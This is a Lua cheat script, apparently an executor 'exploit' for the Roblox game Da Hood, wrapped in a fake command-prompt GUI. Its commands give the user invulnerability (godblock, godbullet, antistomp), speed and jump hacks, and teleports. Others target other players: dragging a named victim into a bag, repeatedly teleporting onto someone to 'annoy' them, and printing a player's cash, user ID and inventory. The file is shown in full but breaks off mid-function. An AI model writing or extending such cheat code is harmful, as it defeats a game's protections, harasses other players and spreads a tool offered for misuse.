
-- Gui to Lua
-- Version: 3.2

-- Instances:

local CypherBrewLoadingScreen = Instance.new("ScreenGui")
local CypherLoadingMain = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local LoadingLabel = Instance.new("TextLabel")
local Frame = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local loadinglabel2 = Instance.new("TextLabel")

--Properties:

CypherBrewLoadingScreen.Name = "CypherBrew Loading Screen"
CypherBrewLoadingScreen.Parent = game.CoreGui
CypherBrewLoadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

CypherLoadingMain.Name = "CypherLoadingMain"
CypherLoadingMain.Parent = CypherBrewLoadingScreen
CypherLoadingMain.Active = true
CypherLoadingMain.BackgroundColor3 = Color3.fromRGB(3, 3, 3)
CypherLoadingMain.BorderSizePixel = 0
CypherLoadingMain.Position = UDim2.new(0.234614849, 0, 0.332535207, 0)
CypherLoadingMain.Size = UDim2.new(0, 565, 0, 298)
CypherLoadingMain.Draggable = true;

TextLabel.Parent = CypherLoadingMain
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0161290318, 0, 0.106375843, 0)
TextLabel.Size = UDim2.new(0, 164, 0, 19)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Command Prompt [Version 4.0]"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 15.000

TextLabel_2.Parent = CypherLoadingMain
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.0161290318, 0, 0.168307245, 0)
TextLabel_2.Size = UDim2.new(0, 230, 0, 18)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "(c) 2021 CypherBrew Corp. All rights reserved"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 15.000

TextLabel_3.Parent = CypherLoadingMain
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0, 0, 0.321551085, 0)
TextLabel_3.Size = UDim2.new(0, 99, 0, 15)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "C:\\Users\\Admin>"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextSize = 15.000

LoadingLabel.Name = "LoadingLabel"
LoadingLabel.Parent = CypherLoadingMain
LoadingLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
LoadingLabel.BackgroundTransparency = 1.000
LoadingLabel.BorderSizePixel = 0
LoadingLabel.Position = UDim2.new(0.174093649, 0, 0.321551085, 0)
LoadingLabel.Size = UDim2.new(0, 273, 0, 15)
LoadingLabel.Font = Enum.Font.SourceSans
LoadingLabel.Text = ""
LoadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadingLabel.TextSize = 15.000
LoadingLabel.TextXAlignment = Enum.TextXAlignment.Left

Frame.Parent = CypherLoadingMain
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Size = UDim2.new(0, 565, 0, 32)

ImageLabel.Parent = Frame
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.Position = UDim2.new(0, 0, -0.0153104067, 0)
ImageLabel.Size = UDim2.new(0, 29, 0, 27)
ImageLabel.Image = "http://www.roblox.com/asset/?id=5040009517"

loadinglabel2.Name = "loading label2"
loadinglabel2.Parent = Frame
loadinglabel2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
loadinglabel2.BackgroundTransparency = 1.000
loadinglabel2.BorderSizePixel = 0
loadinglabel2.Position = UDim2.new(0.0637976825, 0, 0.0553691387, 0)
loadinglabel2.Size = UDim2.new(0, 164, 0, 27)
loadinglabel2.Font = Enum.Font.SourceSans
loadinglabel2.Text = "CypherBrew Command Prompt"
loadinglabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
loadinglabel2.TextSize = 15.000

--// Scripts:
loadinglabel2.Text = "Loaded!"
wait(0.4)
loadinglabel2.Text = "Stolen By Dawn hehe L"
wait(0.4)
loadinglabel2.Text = "CypherBrew Command Prompt"
wait(0.4)
LoadingLabel.Text = "Loading..."
wait(0.4)
LoadingLabel.Text = "Loading.."
wait(0.4)
LoadingLabel.Text = "Loading."
wait(0.4)
LoadingLabel.Text = "Loading"
wait(0.4)
LoadingLabel.Text = "Loading..."
wait(0.4)
LoadingLabel.Text = "Loading.."
wait(0.4)
LoadingLabel.Text = "Loading."
wait(0.4)
LoadingLabel.Text = "Loading"
wait(0.4)
LoadingLabel.Text = "Ready To Use!"
wait(1)
LoadingLabel.Text = "Closing.."
CypherLoadingMain.Visible = false;
--OMG ITS FALSE!!!!111!!!1!1!!!

if game.CoreGui:FindFirstChild("CypherBrew") then
	game.CoreGui:FindFirstChild("CypherBrew"):Destroy()
end;

-- Instances:

local CypherBrew = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local Top = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local TextLabel_3 = Instance.new("TextLabel")
local TextLabel_4 = Instance.new("TextLabel")
local InputBox = Instance.new("TextBox")

--Properties:

CypherBrew.Name = "CypherBrew"
CypherBrew.Parent = game.CoreGui
CypherBrew.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = CypherBrew
Main.Active = true
Main.BackgroundColor3 = Color3.fromRGB(3, 3, 3)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.195954397, 0, 0.340033501, 0)
Main.Size = UDim2.new(0, 565, 0, 298)

Top.Name = "Top"
Top.Parent = Main
Top.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Top.BorderSizePixel = 0
Top.Size = UDim2.new(0, 565, 0, 30)

ImageLabel.Parent = Top
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0, 0, -0.0333333351, 0)
ImageLabel.Size = UDim2.new(0, 34, 0, 31)
ImageLabel.Image = "http://www.roblox.com/asset/?id=5040009517"

TextLabel.Parent = Top
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0601769909, 0, -0.0333333351, 0)
TextLabel.Size = UDim2.new(0, 173, 0, 31)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Cypherbrew Command Prompt"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 15.000

TextLabel_2.Parent = Main
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0, 0, 0.0975391492, 0)
TextLabel_2.Size = UDim2.new(0, 179, 0, 22)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Command Prompt [Version 4.0]"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 15.000

TextLabel_3.Parent = Main
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0.010619469, 0, 0.171364605, 0)
TextLabel_3.Size = UDim2.new(0, 244, 0, 16)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "(c) 2020 Cypherbrew Corp. All rights reserved"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextSize = 15.000

TextLabel_4.Parent = Main
TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.BackgroundTransparency = 1.000
TextLabel_4.BorderSizePixel = 0
TextLabel_4.Position = UDim2.new(0, 0, 0.282102853, 0)
TextLabel_4.Size = UDim2.new(0, 106, 0, 22)
TextLabel_4.Font = Enum.Font.SourceSans
TextLabel_4.Text = "C:\\Users\\Admin>"
TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.TextSize = 15.000

InputBox.Parent = Main
InputBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InputBox.BackgroundTransparency = 1.000
InputBox.BorderSizePixel = 0
InputBox.Position = UDim2.new(0.187610626, 0, 0.282102853, 0)
InputBox.Size = UDim2.new(0, 200, 0, 22)
InputBox.Font = Enum.Font.SourceSans
InputBox.PlaceholderText = "-- Command Here, Made By SploitGodZ"
InputBox.Text = ""
InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
InputBox.TextSize = 14.000
InputBox.TextXAlignment = Enum.TextXAlignment.Left

-- Scripts:

local function PMCARTO_fake_script() -- Main.Dragify 
	local script = Instance.new('LocalScript', Main)

	local UIS = game:GetService("UserInputService")
	function dragify(Frame)
	    dragToggle = nil
	    local dragSpeed = 0
	    dragInput = nil
	    dragStart = nil
	    local dragPos = nil
	    function updateInput(input)
	        local Delta = input.Position - dragStart
	        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
	        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
	    end
	    Frame.InputBegan:Connect(function(input)
	        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
	            dragToggle = true
	            dragStart = input.Position
	            startPos = Frame.Position
	            input.Changed:Connect(function()
	                if input.UserInputState == Enum.UserInputState.End then
	                    dragToggle = false
	                end
	            end)
	        end
	    end)
	    Frame.InputChanged:Connect(function(input)
	        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
	            dragInput = input
	        end
	    end)
	    game:GetService("UserInputService").InputChanged:Connect(function(input)
	        if input == dragInput and dragToggle then
	            updateInput(input)
	        end
	    end)
	end
	
	dragify(script.Parent)
end
coroutine.wrap(PMCARTO_fake_script)()



local cosbySettings = {
	Version = 'v2.4.2';
	ChatWaitTime = 0.40;--Waits an amount of time before chatting after a command
	PrefixOfOutput = "[CypherBrew]";
	SilentMode = false;-- Forces Commands to not send Outputs (Messages) for commands such as "cash"
	Toggle = false;
	Hotkey = 'V';
	Discord = 'WsUt4pEHyn';
};

local notifSettings = {
	["NotifTitle"] = "[CypherBrew] "; -- // put a fucking space after mf
	["NotifIcon"] = "rbxassetid://6337685637";
	["NotifSound"] = "rbxassetid://4590656842";
};


-- // Variables
local Players = game:GetService("Players");
local Player = Players.LocalPlayer;
local localPlayer = Players.LocalPlayer;
local localCharacter = localPlayer.Character;
local Mouse = Player:GetMouse();
local Box = CommandBox;
local List = Commands;
local Back = Background;
local Layout = UIListLayout;
local Template = Template


-- // Services
local TweenService = game:GetService("TweenService");
local UserInput = game:GetService("UserInputService");


-- // Loop Variables
local loopVariables = {
	["Antibag"] = false;
	["Antislow"] = false;
	["Antistomp"] = false;
	["Antiflash"] = false;
	["Godbullet"] = false;
	["Godblock"] = false;
	["Walkspeed"] = false;-- // not a loop but yk
	["Jumppower"] = false;-- // not a loop but yk
	["Flying"] = false;-- // not a loop but yk
	["Noclip"] = false;
	["Freefists"] = false;
	["Targetting"] = false;
	["Arresting"] = false;
	["Infinitezoom"] = false;
	["Airstrike"] = false;
	["Toolreach"] = false;
	["Fistreach"] = false;
	["Rpglock"] = false;
	["Spectating"] = false;
	["Annoying"] = false;
	["Autostomp"] = false;
	["AutoGrabMoneyInMagnitude"] = false;
}

-- // Preset default commands.
local cosbyCommands = {
	["ping"] = function(args)
		sendOutput("pong");
	end;

	["echo"] = function(...)
		local tabulatedTuple = {...};
		print(table.concat(tabulatedTuple, " "));
	end;
}

-- // Utility
	function split(s, d) 
		local content = {} 
		for v in s:gmatch("[^"..d.."]+") do 
			table.insert(content, v);
		end
		return content
	end;

	function getRoot(char)
		local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
		return rootPart
	end

	function findPlayer(name)
		name = name:lower();
		if (name == 'me') then
			return game:GetService'Players'.LocalPlayer;
		end;
		for i, v in pairs(game:GetService'Players':GetPlayers()) do
			if (v.Name:lower():find(name) == 1) then
				return v;
			end;
		end;
	end;

	function TweenFramePosition(frame, endudim2, tweentime)
		local goal = {};
		goal.Position = endudim2;
		local info = TweenInfo.new(tweentime);        
		local a = TweenService:Create(frame, info, goal);
		a:Play();
	end;




function bag(name) -- // This is shit, but its meant to work for all exploits + it gets your target and only them (credits to krnlly cuz i kinda stole this from him but imrpoved it a bit.)
	if (game:GetService("Players")[name].Character.BodyEffects["K.O"].Value == false) then
		game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Ignored.Shop['[BrownBag] - $25'].Head.CFrame;
		wait(.30);
		fireclickdetector(game:GetService("Workspace").Ignored.Shop['[BrownBag] - $25'].ClickDetector);
		game:GetService("Players").LocalPlayer.Backpack:WaitForChild("[BrownBag]").Parent = game:GetService("Players").LocalPlayer.Character;
		repeat
			wait();
			getRoot(game:GetService("Players")[name].Character).CFrame = getRoot(game:GetService("Players").LocalPlayer.Character).CFrame + Vector3.new(1, 3, 0);
			game:GetService("Players").LocalPlayer.Character["[BrownBag]"]:Activate();
		until game:GetService("Players")[name].Character:FindFirstChild("Christmas_Sock");
		sendNotif("", "Successfully Bagged "..name, 15);
	else
		sendNotif("", name.." Is Currently Knocked.", 15);
	end;
end;

function info(name) -- // This is shit, but its meant to work for all exploits + it gets your target and only them (credits to krnlly cuz i kinda stole this from him but imrpoved it a bit.) (corpse)
	print("------------------")
	print(""..name.." Has:")
	print("------------------")
	for i, v in pairs(game:GetService("Players")[name].Backpack:GetDescendants()) do
		if v:IsA("Tool") then
			print(""..v.Name.."")
		end
	end
	print("------------------")
	print(""..name.." Infomation:")
	print("------------------")
	print("Account Age: "..game:GetService("Players")[name].AccountAge..".")
	print("User ID: "..game:GetService("Players")[name].UserId..".")
	print("Cash: $"..game:GetService("Players")[name].DataFolder.Currency.Value..".")
	print("Wanted: "..game:GetService("Players")[name].DataFolder.Information.Wanted.Value..".")
	print("Shoes Collected: "..game.Players.LocalPlayer.Character.BodyEffects.ShoesCollect.Value..".")
	print("Shirt Template: "..workspace.Players[name].Shirt.ShirtTemplate..".")
	print("Pants Template: "..workspace.Players[name].Pants.PantsTemplate..".")
	print("Crew ID: "..game:GetService("Players")[name].DataFolder.Information.Crew.Value..".")
	print("Sound ID: "..workspace.Players[name].LowerTorso.BOOMBOXSOUND.SoundId..".")
	print("------------------")
end;

function sendNotif(title, description, duration)
	local milf = coroutine.wrap(function()
		local notifSound = Instance.new("Sound", game.CoreGui);
		notifSound.SoundId = notifSettings.NotifSound;
		notifSound:Play();
		wait(4);
		notifSound:Destroy();
	end);
	milf()
	game.StarterGui:SetCore("SendNotification", {
		Title = notifSettings.NotifTitle..title;
		Text = description;
		Icon = notifSettings.NotifIcon;
		Duration = duration;
	})
end;

respawnPlr = function()
	local plr = game:GetService("Players").LocalPlayer
	local char = plr.Character
	local oldPos = char.HumanoidRootPart.CFrame;
	char:ClearAllChildren()
	local newChar = Instance.new("Model", workspace)
	plr.Character = newChar
	wait()
	plr.Character = char
	newChar:Destroy()
	game:service'Players'.LocalPlayer.Character:BreakJoints()
	wait(game:service'Players'.RespawnTime + 0.5)
	wait(0.30)
	game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = oldPos
	wait(0.5)
end

function sendOutput(str)
	if not str then
		return
	end;
	wait(cosbySettings.ChatWaitTime);
	if str:match("\n") then
		for _, line in next, split(str, "\n") do
			if not cosbySettings.SilentMode then
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(cosbySettings.PrefixOfOutput..line, 'All');
			end
		end
	else
		if not cosbySettings.SilentMode then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(cosbySettings.PrefixOfOutput..str, 'All');
		end
	end
end;

function addCommand(args)
      if (args['Aliases']) then
         cosbyCommands[args["Name"]] = args["Function"];
         for _, v in next, args['Aliases'] do
         cosbyCommands[v] = args["Function"];
          end;
      else
        cosbyCommands[args["Name"]] = args["Function"];
    end;
end;

function runCommand(str)
	if not str then return end;
	str = string.sub(str, 1, #str):lower();
	local tbl_Split = split(str, " ");
	local str_Command = tbl_Split[1];
	local tbl_Args = {};
	for index, value in next, tbl_Split do
		if (index ~= 1) then
			table.insert(tbl_Args, value);
		end
	end
	(cosbyCommands[str_Command] or function(...)
	end)(unpack(tbl_Args));
end;

-- // Command Bar Stuff
InputBox.FocusLost:Connect(function(enter)
		if not enter then InputBox.Text = ''; return; end;
		runCommand(InputBox.Text);
		InputBox.Text = '';
end);

game:GetService('UserInputService').InputBegan:Connect(function(key, e)
	if (e) then return end;
	if (key.KeyCode == Enum.KeyCode.V) then
		InputBox:CaptureFocus();
		wait(.10);
		InputBox.Text = '';
	end;
end);

-- // Commands
do
	local localPlayer = game:GetService("Players").localPlayer;
	local lplayer = localPlayer
	local localCharacter = localPlayer.Character;

	-- // discord
	addCommand({
		["Name"] = "discord";
		["Function"] = function(plr)
			setclipboard("https://discord.gg/"..cosbySettings.Discord)
			sendNotif("", "Copied Discord Invite To Clipboard (https://discord.gg/"..cosbySettings.Discord..")", 15);
		end;
	});

	addCommand({
		["Name"] = "tp";
		["Function"] = function(plr)
			local target = findPlayer(plr);
			sendOutput(" Teleporting to "..tostring(game:GetService("Players")[target.Name])..'...');
			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[target.Name].Character.HumanoidRootPart.CFrame;
		end;
	});

	addCommand({
		["Name"] = "annoy";
		["Function"] = function(plr)
			local target = findPlayer(plr);
			if (loopVariables.Annoying == false) then
				loopVariables.Annoying = true;
				sendOutput(" Annoying "..tostring(game:GetService("Players")[target.Name])..'...');
			else
				loopVariables.Annoying = false;
				sendOutput(" Stopped Annoying "..tostring(game:GetService("Players")[target.Name])..'...');
			end;
			while true do
				wait()
				if loopVariables.Annoying == true then
					game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[target.Name].Character.HumanoidRootPart.CFrame;
				end
			end
		end;
	});


	addCommand({
		["Name"] = "help";
		["Function"] = function(plr)
			for i, v in next, cosbyCommands do
				print(i);
			end;
			sendNotif("", "Printed Commands to Console (press F9) or type in the chat: /console");
		end;
	});


	addCommand({
		["Name"] = "rj";
		["Function"] = function()
			if (#Players:GetPlayers() <= 1) then
				game:GetService('TeleportService'):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer);
			else
				game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, game:GetService("Players").LocalPlayer);
			end
		end;
	});

	addCommand({
		["Name"] = "antibag";
		["Function"] = function() -- // Pretty crazy how this doesn't need a global variable
			if (loopVariables.Antibag == false) then
				loopVariables.Antibag = true;
				sendNotif("", "Antibag Enabled.", 15);
			else
				loopVariables.Antibag = false;
				sendNotif("", "Antibag Disabled.", 15);
			end;

			while loopVariables.Antibag do
				wait();
				pcall(function()
					game:GetService("Players").LocalPlayer.Character:FindFirstChild("Christmas_Sock"):Destroy();
				end);
			end;
		end;
	});

	addCommand({
		["Name"] = "antislow";
		["Function"] = function()
			if (loopVariables.Antislow == false) then
				loopVariables.Antislow = true;
				sendNotif("", "Antislow Enabled.", 15);
			else
				loopVariables.Antislow = false;
				sendNotif("", "Antislow Disabled.", 15);
			end;

			game:GetService("Players").LocalPlayer.Character.BodyEffects.Movement.ChildAdded:Connect(function(child)
				wait(0.01)
				if (loopVariables.Antislow == true) then
					if (child.Name == "NoJumping" or child.Name == "ReduceWalk" or child.Name == "NoWalkSpeed") then 
						child:Destroy();
					end;
				end;
			end);
		end;
	});

	addCommand({
		["Name"] = "antistomp";
		["Function"] = function()
			if (loopVariables.Antistomp == false) then
				loopVariables.Antistomp = true;
				sendNotif("", "Antistomp Enabled.", 15);
			else
				loopVariables.Antistomp = false;
				sendNotif("", "Antistomp Disabled.", 15);
			end;
			pcall(function()
				game:GetService("RunService"):BindToRenderStep("rrrrrrrrrrr", 2000, function()
					pcall(function()
						if game:GetService("Players").LocalPlayer.Character.Humanoid.Health <= 30 and loopVariables.Antistomp == true then
							game:GetService("Players").LocalPlayer.Character.Humanoid:UnequipTools()
							game:GetService("Players").LocalPlayer.Character.Humanoid:Destroy()
							workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character
							wait()
							local Model = Instance.new("Model", game:GetService("CorePackages"))
							Instance.new("Part", Model).Name = "Torso"
							Instance.new("Part", Model).Name = "Head"
							Instance.new("Humanoid", Model).Name = "Humanoid"
							game:GetService("Players").LocalPlayer.Character = Model
						end
					end)
				end)
			end)
		end;
	});

	addCommand({
		["Name"] = "antiafk";
		["Function"] = function()
			local vu = game:GetService("VirtualUser")
			game:GetService("Players").LocalPlayer.Idled:connect(function()
				vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
				wait(1)
				vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
			end)
		end;
	});

	-- // set prefix
	addCommand({
		["Name"] = "setprefix";
		["Function"] = function(str)
			cosbySettings.Prefix = str;
			for _, v in next, List:GetChildren() do
				if v:IsA("TextLabel") then
					v:Remove()
				end;
			end;

			for i, c in next, cosbyCommands do
				local a = Template:Clone();
				a.Name = i;
				a.Text = cosbySettings.Prefix..i;
				a.Parent = List;
				a.Visible = true;
			end;
			sendOutput(" Prefix Has Been Set To: "..cosbySettings.Prefix);
		end;
	});

	-- // Da Hood Chat Cash
	addCommand({
		["Name"] = "cash";
		["Function"] = function(str)
			local target = findPlayer(str);
			sendOutput(target.Name.." Has $"..tostring(Players[target.Name].DataFolder.Currency.Value));
			sendNotif("", target.Name.." Has $"..tostring(Players[target.Name].DataFolder.Currency.Value), 15);
		end;
	});

	addCommand({
		["Name"] = "info";
		["Function"] = function(str)
			info(findPlayer(str).Name);
			sendNotif("", "Info Printed To Console", 15);
		end;
	});

	addCommand({
		["Name"] = "information";
		["Function"] = function(str)
			info(findPlayer(str).Name);
			sendNotif("", "Info Printed To Console", 15);
		end;
	});

	-- // Chat Output
	addCommand({
		["Name"] = "output";
		["Function"] = function(str)
			cosbySettings.PrefixOfOutput = str.." ";
			sendOutput(" Output Set To: "..cosbySettings.PrefixOfOutput);
		end;
	});

	-- // prefix
	addCommand({
		["Name"] = "prefix";
		["Function"] = function(str)
			if cosbySettings.Prefix == "" then
				sendOutput(" No Prefix Is Set.");
			else
				sendOutput(" Prefix is: "..cosbySettings.Prefix);
			end
		end;
	});

	-- // silent
	addCommand({
		["Name"] = "silent";
		["Function"] = function(str)
			if (str == "on") then
				cosbySettings.SilentMode = true;
			elseif (str == "off") then
				cosbySettings.SilentMode = false;
				sendOutput("SilentMode has been disabled.");
			end
		end;
	});

	-- // walkspeed
	addCommand({
		["Name"] = "walkspeed";
		["Function"] = function(str)
			if (loopVariables.Walkspeed == false) then
				loopVariables.Walkspeed = true;
				Player.Character:FindFirstChildOfClass("Humanoid").Name = math.random(50, 200);
				Player.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = str
				sendNotif("", "Set Walkspeed to: "..str, 15);
			else
				loopVariables.Walkspeed = false;
				Player.Character:FindFirstChildOfClass("Humanoid").Name = "Humanoid";
				Player.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = 16;
				sendNotif("", "Set Walkspeed to default.", 15);
			end;
		end;
	});

	addCommand({
		["Name"] = "ws";
		["Function"] = function(str)
			if (loopVariables.Walkspeed == false) then
				loopVariables.Walkspeed = true;
				Player.Character:FindFirstChildOfClass("Humanoid").Name = math.random(50, 200);
				Player.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = str
				sendNotif("", "Set Walkspeed to: "..str, 15);
			else
				loopVariables.Walkspeed = false;
				Player.Character:FindFirstChildOfClass("Humanoid").Name = "Humanoid";
				Player.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = 16;
				sendNotif("", "Set Walkspeed to default.", 15);
			end;
		end;
	});

	-- // jumppower
	addCommand({
		["Name"] = "jumppower";
		["Function"] = function(str)
			if (loopVariables.Jumppower == false) then
				loopVariables.Jumppower = true;
				Player.Character:FindFirstChildOfClass("Humanoid").Name = math.random(50, 200);
				Player.Character:FindFirstChildOfClass("Humanoid").JumpPower = str
				sendNotif("", "Set Jumppower to: "..str, 15);
			else
				loopVariables.Jumppower = false;
				Player.Character:FindFirstChildOfClass("Humanoid").Name = "Humanoid";
				Player.Character:FindFirstChildOfClass("Humanoid").JumpPower = 16;
				sendNotif("", "Set Jumppower to default.", 15);
			end;
		end;
	});


	-- // godblock
	addCommand({
		["Name"] = "godblock";
		["Function"] = function()
			if (loopVariables.Godblock == false) then
				loopVariables.Godblock = true;
				sendNotif("CypherBrew", "Godblock Enabled.", 15);
				Player.Character:FindFirstChild("BodyEffects"):FindFirstChild("Defense"):Destroy();
			else
				loopVariables.Godblock = false;
				local shit = Instance.new("NumberValue", Player.Character:FindFirstChild("BodyEffects"));
				shit.Name = "Defense";
				sendNotif("CypherBrew", "Godblock Disabled.", 15);
			end;
		end;
	});

	-- // godbullet
	addCommand({
		["Name"] = "godbullet";
		["Function"] = function()
			if (loopVariables.Godbullet == false) then
				loopVariables.Godbullet = true;
				sendNotif("CypherBrew", "Godbullet Enabled.", 15);
				Player.Character:FindFirstChild("BodyEffects"):FindFirstChild("Defense"):Destroy();
				Player.Character:FindFirstChild("BodyEffects"):FindFirstChild("Armor"):Destroy();
			else
				loopVariables.Godbullet = false;
				local shit = Instance.new("NumberValue", Player.Character:FindFirstChild("BodyEffects"));
				shit.Name = "Defense";
				local shit = Instance.new("IntValue", Player.Character:FindFirstChild("BodyEffects"));
				shit.Name = "Armor";
				sendNotif("CypherBrew", "Godbullet Disabled.", 15);
			end;
		end;
	});

	-- // antiflash
	addCommand({
		["Name"] = "antiflash";
		["Function"] = function()
			if (loopVariables.Antiflash == false) then
				loopVariables.Antiflash = true;
				sendNotif("CypherBrew", "Antiflash Enabled.", 15);
			else
				loopVariables.Antiflash = false;
				sendNotif("CypherBrew", "Antiflash Disabled.", 15);
			end;

			while loopVariables.Antiflash do
				wait();
				pcall(function()
					Player.PlayerGui:FindFirstChild("MainScreenGui"):FindFirstChild("whiteScreen"):Destroy();
				end);
			end;
		end;
	});

	-- // freefists
	addCommand({
		["Name"] = "freefists";
		["Function"] = function()
			if (loopVariables.Freefists == false) then
				loopVariables.Freefists = true;
				sendNotif("CypherBrew", "Freefists Enabled.", 15);
				Player.Character:FindFirstChild("LeftHand")["LeftWrist"]:Destroy();
				Player.Character:FindFirstChild("RightHand")["RightWrist"]:Destroy();
				game:GetService("RunService").RenderStepped:Connect(function()
					if (loopVariables.Freefists == true) then
						Player.Character:FindFirstChild("LeftHand").CFrame = CFrame.new(Mouse.Hit.p);
						Player.Character:FindFirstChild("RightHand").CFrame = CFrame.new(Mouse.Hit.p);
					end;
				end);
			else
				loopVariables.Freefists = false;
				sendNotif("CypherBrew", "Freefists Disabled.", 15)
				local rightwrist = Instance.new("Motor6D");
				rightwrist.Name = "RightWrist";
				rightwrist.Parent = Player.Character.RightHand;
				rightwrist.C0 = CFrame.new(1.18422506e-07, -0.5009287, -6.81715525e-18, 1, 0, 0, 0, 1, 0, 0, 0, 1);
				rightwrist.C1 = CFrame.new(3.55267503e-07, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1);
				rightwrist.Part0 = Player.Character.RightLowerArm;
				rightwrist.Part1 = Player.Character.RightHand;

				local leftwrist = Instance.new("Motor6D");
				leftwrist.Name = "LeftWrist";
				leftwrist.Parent = Player.Character.LeftHand;
				leftwrist.C0 = CFrame.new(0.000475466368, -0.5009287, 7.59417072e-20, 1, 0, 0, 0, 1, 0, 0, 0, 1);
				leftwrist.C1 = CFrame.new(0.000475821638, 0.125045404, 5.92112528e-08, 1, 0, 0, 0, 1, 0, 0, 0, 1);
				leftwrist.Part0 = Player.Character.LeftLowerArm;
				leftwrist.Part1 = Player.Character.LeftHand;
			end;
		end;
	});

	-- // refresh
	addCommand({
		["Name"] = "refresh";
		["Function"] = function()
			respawnPlr();
		end;
	});

	addCommand({
		["Name"] = "respawn";
		["Function"] = function()
			respawnPlr();
		end;
	});

	addCommand({
		["Name"] = "re";
		["Function"] = function()
			respawnPlr();
		end;
	});

	-- Knife & Lockpick Finder
	addCommand({
		["Name"] = "findtools";
		["Function"] = function()
			local d = game.Players.LocalPlayer.Character.HumanoidRootPart.Position;
			for h, i in pairs(game.Workspace.Ignored.ItemsDrop:GetChildren()) do
				if i.Name == "Part" then
					if i:FindFirstChild("[LockPicker]") or i:FindFirstChild("[Knife]") then
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = i.CFrame;
						if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - i.Position).Magnitude <= 50 then
							wait()
						end
					end
				end
			end;
